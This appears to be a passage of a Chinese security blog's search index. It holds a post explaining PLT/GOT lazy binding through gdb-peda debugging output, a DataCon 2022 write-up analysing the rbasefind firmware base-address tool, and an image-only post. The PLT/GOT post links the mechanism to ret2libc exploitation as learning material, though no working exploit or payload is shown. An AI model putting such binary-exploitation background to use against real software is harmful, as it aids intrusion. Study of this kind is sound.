GOT\n&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    print_banner();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="编译链接"><a href="#编译链接" class="headerlink" title="编译链接"></a>编译链接</h5><p><code>gcc -Wall  -g test.c -o test.o -m32</code></p><p><strong>平台</strong>： <strong>kali</strong>-<strong>linux</strong></p><p>开始调试</p><p><strong>首先，在printf函数调用前下一个断点</strong></p><p><img src="/img/plt&got/1.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[-------------------------------------code-------------------------------------]<br>   0x555555555134 &lt;frame_dummy+4&gt;:      jmp    0x5555555550b0 &lt;register_tm_clones&gt;<br>   0x555555555139 &lt;print_banner&gt;:       push   rbp<br>   0x55555555513a &lt;print_banner+1&gt;:     mov    rbp,rsp<br>=&gt; 0x55555555513d &lt;print_banner+4&gt;:     lea    rax,[rip+0xec4]        # 0x555555556008<br>   0x555555555144 &lt;print_banner+11&gt;:    mov    rdi,rax<br>   0x555555555147 &lt;print_banner+14&gt;:    call   0x555555555030 &lt;puts@plt&gt;<br>   0x55555555514c &lt;print_banner+19&gt;:    nop<br>   0x55555555514d &lt;print_banner+20&gt;:    pop    rbp<br></code></pre></td></tr></table></figure><p>跳转到了0x555555555030这个地址，gdb对其的标注为&lt;puts@plt&gt;</p><p>查看一下这个地址上的内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x555555555030<br>   0x555555555030 &lt;puts@plt&gt;:   jmp    QWORD PTR [rip+0x2fca]        # 0x555555558000 &lt;puts@got[plt]&gt;<br>   0x555555555036 &lt;puts@plt+6&gt;: push   0x0<br>   0x55555555503b &lt;puts@plt+11&gt;:        jmp    0x555555555020<br></code></pre></td></tr></table></figure><p>这里第一条指令，jmp 0x555555558000，gdb对其的标注为&lt;puts@got[plt]&gt;，查看这个地址上的值，会发现这个指令在原地跳转：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555558000 <br>0x555555558000 &lt;puts@got[plt]&gt;: 0x0000555555555036 //这个地址就是上面plt表的第二条指令<br></code></pre></td></tr></table></figure><p>相当于什么也没做</p><p>那么根据文章开头的介绍，寻找函数的工作肯定是由第三条指令，<code>jmp 0x555555555020</code>来完成的，这里先不对这个函数进行分析，直接来看结果</p><p><strong>在printf函数后面下断点，重新查看刚才&lt;puts@got[plt]&gt;上的内容</strong></p><p><img src="/img/plt&got/2.jpg"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555558000<br>0x555555558000 &lt;puts@got[plt]&gt;: 0x00007ffff7c75db0<br></code></pre></td></tr></table></figure><p>发现这个地方的值变了，而这个改变后的值就是puts函数在libc中的地址</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x00007ffff7c75db0<br>   0x7ffff7c75db0 &lt;__GI__IO_puts&gt;:      push   r14<br>   0x7ffff7c75db2 &lt;__GI__IO_puts+2&gt;:    push   r13<br>   0x7ffff7c75db4 &lt;__GI__IO_puts+4&gt;:    push   r12<br>   0x7ffff7c75db6 &lt;__GI__IO_puts+6&gt;:    mov    r12,rdi<br>   0x7ffff7c75db9 &lt;__GI__IO_puts+9&gt;:    push   rbp<br>   0x7ffff7c75dba &lt;__GI__IO_puts+10&gt;:   push   rbx<br>   0x7ffff7c75dbb &lt;__GI__IO_puts+11&gt;:   sub    rsp,0x10<br>   0x7ffff7c75dbf &lt;__GI__IO_puts+15&gt;:   call   0x7ffff7c28110 &lt;*ABS*+0x99da0@plt&gt;<br>   0x7ffff7c75dc4 &lt;__GI__IO_puts+20&gt;:   mov    r13,QWORD PTR [rip+0x17e04d]        # 0x7ffff7df3e18<br>   0x7ffff7c75dcb &lt;__GI__IO_puts+27&gt;:   mov    rbx,rax<br></code></pre></td></tr></table></figure><p><strong>因此可以得出结论</strong></p><p>​    plt表中会先尝试跳转到got表上的函数地址，如果是第一次调用，会进行一次无效跳转，然后去寻找真正的地址填充在got表项上，然后调用；如果是第二次调用，会直接jmp到got表真实的函数地址上</p><p>​    这样就是为什么ret2libc需要使用用已被调用过的函数</p><p><em>tips：</em></p><p><em>linux程序都有一个libc_start_main函数，且会在main函数之前被调用，所以可以在ret2libc时无脑用这个函数(只是个人猜测，并未实际验证)</em></p><p><strong>然后解决如何寻找函数地址的问题</strong>：</p><p>​    在plt表的第二条汇编指令中，push 0x0为寻址函数提供了一个参数，如果打开一个具有多个plt表项的程序，会发现每一项这个值都是不同的：</p><p><img src="/img/plt&got/3.jpg"></p><p>​    这个push的值唯一标识了寻找的函数，</p><p>​    然后再看第三条指令，观察发现这个jmp指令跳转到了plt表的开头（可以在objdump里看到这也是一个plt表项，但是代码与其他表项形式不同）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/10i 0x555555555020<br>   0x555555555020:      push   QWORD PTR [rip+0x2fca]        # 0x555555557ff0<br>   0x555555555026:      jmp    QWORD PTR [rip+0x2fcc]        # 0x555555557ff8<br></code></pre></td></tr></table></figure><p>如果在gdb未开始调试的时候，查看这个jmp的值，是0x0</p><p>而在printf函数前的断点查看，会发现它发生了变化</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs assembly">gdb-peda$ x/x 0x555555557ff8<br>0x555555557ff8: 0x00007ffff7fdc080<br><br>gdb-peda$ x/10i 0x00007ffff7fdc080<br>   0x7ffff7fdc080 &lt;_dl_runtime_resolve_xsavec&gt;: push   rbx<br>   0x7ffff7fdc081 &lt;_dl_runtime_resolve_xsavec+1&gt;:       mov    rbx,rsp<br>   0x7ffff7fdc084 &lt;_dl_runtime_resolve_xsavec+4&gt;:       and    rsp,0xffffffffffffffc0<br>   0x7ffff7fdc088 &lt;_dl_runtime_resolve_xsavec+8&gt;:<br>    sub    rsp,QWORD PTR [rip+0x20be1]        # 0x7ffff7ffcc70 &lt;_rtld_global_ro+432&gt;<br>   0x7ffff7fdc08f &lt;_dl_runtime_resolve_xsavec+15&gt;:      mov    QWORD PTR [rsp],rax<br>   0x7ffff7fdc093 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp+0x8],rcx<br>   0x7ffff7fdc098 &lt;_dl_runtime_resolve_xsavec+24&gt;:      mov    QWORD PTR [rsp+0x10],rdx<br>   0x7ffff7fdc09d &lt;_dl_runtime_resolve_xsavec+29&gt;:      mov    QWORD PTR [rsp+0x18],rsi<br>   0x7ffff7fdc0a2 &lt;_dl_runtime_resolve_xsavec+34&gt;:      mov    QWORD PTR [rsp+0x20],rdi<br>   0x7ffff7fdc0a7 &lt;_dl_runtime_resolve_xsavec+39&gt;:      mov    QWORD PTR [rsp+0x28],r8<br><br></code></pre></td></tr></table></figure><p>这个函数为<code>_dl_runtime_resolve(link_map_obj, reloc_index)</code>，此处不在对其具体分析，其用处即为寻找编号为<code>reloc_index</code>的函数</p><h5 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h5><p><strong>第一次调用</strong></p><p><img src="/img/plt&got/4.jpg"></p><p><strong>第二次调用</strong></p><p><img src="/img/plt&got/5.jpg"></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf-pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>菜鸡的2022datacon记录</title>
    <link href="/2022/11/16/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/"/>
    <url>/2022/11/16/%E8%8F%9C%E9%B8%A1%E7%9A%842022datacon/</url>
    
    <content type="html"><![CDATA[<h4 id="固件基地址识别"><a href="#固件基地址识别" class="headerlink" title="固件基地址识别"></a>固件基地址识别</h4><p>rbasefind - <a href="https://github.com/sgayou/rbasefind">https://github.com/sgayou/rbasefind</a></p><p>此项目用rust写的，用<code>cargo build</code>之后会生成可执行文件在<code>target</code>路径下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">rbasefind &lt;<span class="hljs-type">path</span>-<span class="hljs-keyword">to</span>-bin&gt; <br></code></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs sh">Located 4052 strings<br>Located 197089 pointers<br>Scanning with 2 threads...<br>0x2c0dc000: 3818<br>0x2c0dd000: 280<br>0x2c0db000: 274<br>0x2c0da000: 232<br>0x2c0de000: 228<br>0x2c0d7000: 202<br>0x2c0d9000: 200<br>0x2c0df000: 199<br>0x2c0e1000: 184<br>0x2c0e6000: 181<br></code></pre></td></tr></table></figure><p>通常来讲第一行（也就是数字最大的那个）为固件的基地址，但是很多时候识别不出来（比如几行都是1）</p><p>实际在datacon的数据上测试的结果，使用的时候所有参数都是default（因为当时并没有仔细看代码….）</p><p><img src="/img/datacon/1.jpg"></p><p>应该是50个固件识别成功了38个</p><h5 id="对rbasefind源码的分析"><a href="#对rbasefind源码的分析" class="headerlink" title="对rbasefind源码的分析"></a>对rbasefind源码的分析</h5><p>按程序执行顺序分析</p><ol><li><p><code>get_strings()</code></p><p>利用一个正则表达式匹配</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">[ -~<span class="hljs-symbol">\t</span>\r<span class="hljs-symbol">\n</span>]&#123;10,&#125;  // 从空格(48)到制表符(126) 以及 \r<span class="hljs-symbol">\n</span> 的所有有效字符 <br></code></pre></td></tr></table></figure><p>长度至少是10的字符串（10为参数minstrlen，最小字符串搜索长度）</p></li><li><p><code>get_pointers()</code></p><p>提取整个文件的u32（？），会根据参数<code>big_endian</code>判断文件的大小端</p></li><li><p><code>find_match() -&gt; Interval::get_range()</code></p><p>把32位地址空间平均分为n部分，n位参数的threads（开启的线程数）</p></li><li><p>每一个interval对应一个线程，以offset字节为一组（offset为输入的参数，默认为4096）</p></li><li><p>下面的代码中current_addr遍历了<code> [interval.start_addr : interval.end_addr : offset]</code></p><p>将每个str的首地址加上current_addr，把这些地址和pointers集合取交集</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">while</span> current_addr &lt;= interval.end_addr &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">news</span> = FnvHashSet::<span class="hljs-title function_ invoke__">default</span>();<br>    <span class="hljs-keyword">for</span> <span class="hljs-variable">s</span> <span class="hljs-keyword">in</span> strings &#123;<br>        <span class="hljs-keyword">match</span> s.<span class="hljs-title function_ invoke__">checked_add</span>(current_addr) &#123;<br>            <span class="hljs-title function_ invoke__">Some</span>(add) =&gt; news.<span class="hljs-title function_ invoke__">insert</span>(add),<br>            <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">continue</span>,<br>        &#125;;<br>    &#125;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">intersection</span>: FnvHashSet&lt;_&gt; = news.<span class="hljs-title function_ invoke__">intersection</span>(pointers).<span class="hljs-title function_ invoke__">collect</span>();<br>    <span class="hljs-keyword">if</span> !intersection.<span class="hljs-title function_ invoke__">is_empty</span>() &#123;<br>        heap.<span class="hljs-title function_ invoke__">push</span>((intersection.<span class="hljs-title function_ invoke__">len</span>(), current_addr));<br>    &#125;<br>    <span class="hljs-keyword">match</span> current_addr.<span class="hljs-title function_ invoke__">checked_add</span>(config.offset) &#123;<br>        <span class="hljs-title function_ invoke__">Some</span>(_) =&gt; current_addr += config.offset,<br>        <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">break</span>,<br>    &#125;;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>取出交集size最大的top n个current_addr进行输出</p><p>见本节最开头的示例，输出格式为 addr :  interaction_size</p><p>size最大的即认为是最有可能的基地址</p><p><strong>目前尚不清楚这样做的道理是什么</strong></p><p>猜测：首先，基地址是一个offset的倍数，那么遍历0~2^32所有offset的倍数（也就是current_offset），字符串在程序运行时会被装载到基地址后面的一段空间内，而pointers里会有很多指向字符串真实地址的指针，如果能将strings和pointers匹配上很多，说明这个current_addr就是程序的基地址</p><p>（纯瞎猜:broken_heart:）</p></li></ol><h4 id="函数符号恢复"><a href="#函数符号恢复" class="headerlink" title="函数符号恢复"></a>函数符号恢复</h4>]]></content>
    
    
    
    <tags>
      
      <tag>exp</tag>
      
      <tag>datacon</tag>
      
      <tag>iot-sec，powershell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>可爱的小黄鸡</title>
    <link href="/2022/11/16/%E5%B0%8F%E9%BB%84%E9%B8%A1/"/>
    <url>/2022/11/16/%E5%B0%8F%E9%BB%84%E9%B8%A1/</url>
    
    <content type="html"><![CDATA[<p>可爱的小黄鸡 0v0</p><p><img src="/img/basic/1.jpg"><br><img src="/img/basic/2.jpg"><br><img src="/img/basic/3.jpg"><br><img src="/img/basic/4.jpg"><br><img src="/img/basic/5.jpg"><br><img src="/img/basic/6.jpg"><br><img src="/img/basic/7.jpg"><br><img src="/img/basic/9.jpg"><br><img src="/img/basic/1.gif"><br><img src="/img/basic/2.gif"></p>]]></content>
    
    
    
    <tags>
      
      <tag>Others</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
